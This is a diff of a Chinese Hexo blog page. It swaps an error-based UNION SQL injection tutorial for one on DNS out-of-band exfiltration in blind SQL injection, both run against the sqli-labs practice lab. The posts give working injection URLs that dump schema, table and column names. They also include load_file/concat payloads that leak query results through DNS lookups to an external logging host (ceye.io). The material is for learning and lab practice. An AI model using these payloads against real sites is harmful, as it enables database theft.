@@ -5,12 +5,12 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>sql注入1 - Hexo</title>
+    <title>SQL-DNS注入 - Hexo</title>
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate">
     <meta name="keywords" content="npmlab,"> 
-    <meta name="description" content="既然说到sql注入，那就不得不来科普一波这项技能的原理了。这里就不解释那么多繁杂的书面语了。通俗的说，就是在访问网站的时候网站会根据你的输入向他所连接的数据库进行查询，这时，你就能根据网站向数据库进,"> 
+    <meta name="description" content="对于sql盲注，常见的方法就是二分法去一个个猜，但是这样的方法麻烦不说，还很容易因为数据请求频繁导致被ban，所以可以将select到的数据发送给一个url，利用dns解析产生的记录日志来查看数据。,"> 
     <meta name="author" content="John Doe"> 
     <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -35,7 +35,7 @@
     <div class="bar" style="width: 0;"></div>
     <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
     <div title="播放/暂停" class="icon-play"></div>
-    <h3 class="subtitle">sql注入1</h3>
+    <h3 class="subtitle">SQL-DNS注入</h3>
     <div class="social">
         <!--<div class="like-icon">-->
             <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
@@ -53,55 +53,34 @@
     <div class="section">
         <div class="article">
     <div class="main">
-        <h1 class="title">sql注入1</h1>
+        <h1 class="title">SQL-DNS注入</h1>
         <div class="stuff">
             <span>三月 30, 2019</span>
             
 
         </div>
         <div class="content markdown">
-            <p><strong>既然说到sql注入，那就不得不来科普一波这项技能的原理了。<br>这里就不解释那么多繁杂的书面语了。通俗的说，就是在访问网站的时候<br>网站会根据你的输入向他所连接的数据库进行查询，这时，你就能根据网站向数据库进行查询的规律<br>拼凑恶意的查询语句，混入他的查询语句中，通过界面对你查询的反馈 ，从而输出你所需要的数据</strong>。</p>
-<p><strong>话不多说，我们直接进入主题</strong></p>
-<h2 id="sql注入：显错注入"><a href="#sql注入：显错注入" class="headerlink" title="sql注入：显错注入"></a>sql注入：显错注入</h2><p>在讲具体解法之前先介绍一些函数以及语句的用途。</p>
-<p><code>ID=1，2，3……</code></p>
-<p>可以根据页面的反馈测试该表下的字段有多少列；</p>
-<p><code>order by</code></p>
-<p>函数可以测试当前该列表有几个字段；</p>
-<p><code>union select 1,2,3,.....</code></p>
-<p>联合查询<br><em>(ps:若果要使union的查询显示在界面中，要先使union的左边条件为错误，这样可以使反馈的字段只显示你所需要的查询结果）</em><br>可以测试该列表的回显的是哪几个字段</p>
-<p>union select 1,group_concat(你所要显示排序的表名),3 from 该表的路径</p>
-<p>数据库的路径包括–数据库的名称– 数据库下你所查询数据表的名字</p>
-<pre><code>union select 1,database()3,from xxxxx
-</code></pre><p>from后输入mysql系统自带的储存数据库名称的表名<br>可回显当前的页面数据所在的数据库名称</p>
-<p>group_concat(xxx)</p>
-<p>该函数的作用是将括号内填入的表内数据进行排序</p>
-<p>这里不得不提到mysql自带的数据库information_schema下的几个表了，可以说这是这次注入比较关键的点。</p>
-<p><strong><em>schemata表</em></strong></p>
-<p>该表存放着mysql数据库下的所有库的信息，show databases命令就是来自该表；<br>schema_name、default_character_set_name等几个重要的列也是属于该表的；<br>其中schema_name存放着的就是mysql数据库下所有的库的名字；</p>
-<p><strong><em>table表</em></strong></p>
-<p>table表，该表存放了关于所有表的信息，比较重要的是table_name;table_schema;<br>一个是存放表所属于的数据库的信息的（就是表属于哪个数据库），另一个存放的是所有表的名字（爆数据就用该该表）；</p>
-<p><strong><em>columns表    </em></strong></p>
-<p>重要的是三个列，<br>table_schema:字段所属的数据库的名字；<br>table_name：字段所属的数据表的名字；<br>column_name:字段的名字；</p>
-<p>记住这几个表，对注入非常有帮助。</p>
-<hr>
-<p>基础原理已经了解的差不多了，是时候上手试一试了</p>
-<p>下面的内容都是在sqli-labs的前几关进行的，那么我们先来试一试sql的显错注入</p>
-<p>先在id上进行回显的测试<br>一般来说就是id=1 , id=’ ,id=1’ </p>
-<pre><code>http://localhost/sql/less-1?id=1&apos; and 1=2  union select 1, group_concat(table_name),3 from information_schema.tables--+
-</code></pre><p><strong>查询tables里table_name的内容</strong></p>
-<pre><code>http://localhost/sql/less-1?id=1&apos; and 1=2  union select 1, group_concat(table_schema),3 from information_schema.tables--+
-</code></pre><p><strong>查询表所属的数据库名称</strong></p>
-<pre><code>http://localhost/sql/less-1?id=1&apos; and 1=2  union select 1, group_concat(schema_name),3 from information_schema.schemata--+
-</code></pre><p><strong>查询所有数据库的名称</strong></p>
-<pre><code>http://localhost/sql/less-1?id=1&apos; and 1=2  union select 1, database(),3 from information_schema.schemata--+
-</code></pre><p><strong>查询表所属的数据库的名称</strong></p>
-<pre><code>http://localhost/sql/less-1?id=1&apos; and 1=2  union select 1, group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;--+
-</code></pre><p><strong>查询该数据库中的表的名称 然后进行排序 where后添加查询的条件  比如：在哪个表下查询=‘查询的内容’</strong></p>
-<pre><code>http://localhost/sql/less-1?id=1&apos; and 1=2  union select 1, group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+
-</code></pre><p><strong>查询该数据库中 表的字段名字 </strong></p>
-<p>于是我们就可以通过上述的例子或者是根据这样的查询语法得出该数据库更多的有价值的信息。</p>
-<p>（ps:union select 联合查询左右要进行平衡) </p>
-
+            <p>对于sql盲注，常见的方法就是二分法去一个个猜，但是这样的方法麻烦不说，还很容易因为数据请求频繁导致被ban，所以可以将select到的数据发送给一个url，利用dns解析产生的记录日志来查看数据。</p>
+<blockquote>
+<p>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息<br>简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息</p>
+</blockquote>
+<p>首先，你得有一个域名(abc.com)，搭建好vps环境，之后访问XXXXX.abc.com，dns服务会将此解析放入log记录中，之后我们可以通过查看log记录来获取之前select查询到的信息。</p>
+<blockquote>
+<p>如果没有自己的vps，没有相关条件怎么办？<br>网上也有不少这样的dnslog平台<br>这里推荐一个免费的：<a href="http://ceye.io" target="_blank" rel="noopener">http://ceye.io</a></p>
+</blockquote>
+<p>这个域名的作用就是接收DNS记录的。</p>
+<blockquote>
+<p><strong>LOAD_FILE(file_name)</strong><br>读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet。<br>如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。<br>在MySQL5.0.19，character_set_filesystem系统变量控制文件名的解释，即仅作文字字符串。</p>
+</blockquote>
+<p>接下来就是尝试获取数据</p>
+<ul>
+<li>利用payload是：load_file(concat(‘\\\\‘,(select database()),’.xxxx.ceye.io\abc’))</li>
+</ul>
+<p>concat是字符串拼接<br>database()就是你要做SQL查询的地方<br>‘xxx.ceye.io\abc’就是你的DNS地址，abc随便写。<br>返回的结果就是\\ schema_name.XXXX.ceye.io\abc’，就是带了你数据库名称的三级域名。<br><strong>例如SQLi-LABS 第五关：</strong>  </p>
+<pre><code>payload?id=1&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.XXXXX.ceye.io\\abc&apos;))),1,1)--+
+</code></pre><p>然后查看ceye，成功获取到了数据库名称<br>对于表段，由于load_file()一次只能传输一条数据，所以查询的时候需要使用limit来一个一个的解析。  </p>
+<pre><code>http://127.0.0.1/sqli/Less-5/?id=1&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),&apos;.XXXX.ceye.io\\abc&apos;))),1,1)--+
+</code></pre>
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                 <source type="audio/mpeg" src>
